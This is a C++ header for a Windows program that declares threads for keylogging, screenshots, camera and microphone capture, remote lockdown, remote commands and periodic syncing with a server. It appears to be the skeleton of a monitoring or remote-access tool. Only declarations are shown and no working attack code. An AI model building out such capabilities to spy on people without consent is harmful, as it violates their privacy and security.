#pragma once
#include <windows.h>
#include "../Control/Keylogger.h"
#include "../Control/Recorder.h"
#include "../Control/Camera.h"
#include "../DataManagement/Converters.h"
#include "../Network/Connect.h"
#include "../Control/Screenshoter.h"
#include "../Control/Lockdown.h"
#include "../Network/ApiOperations.h"
#include <string>


struct CompareDates {
	bool operator() (WIN32_FIND_DATA data1, WIN32_FIND_DATA data2) const {
		return data1.ftCreationTime.dwLowDateTime < data2.ftCreationTime.dwLowDateTime;
	}
};

#pragma warning(disable:4996) // Disable "unsafe" warnings
#define SYNC_TIME 60000 // 1 minute

DWORD WINAPI initFiltering(LPVOID lpParam);
DWORD WINAPI initKeylogger(LPVOID lpParam);
DWORD WINAPI initScreenshot(LPVOID lpParam);
DWORD WINAPI initCamera(LPVOID lpParam);
DWORD WINAPI initMic(LPVOID lpParam);
DWORD WINAPI initRemoteLockdown(LPVOID lpParam);
DWORD WINAPI initRemoteCommands(LPVOID lpParam);
DWORD WINAPI initDataManager(LPVOID lpParam);
DWORD WINAPI initRequestManager(LPVOID lpParam);

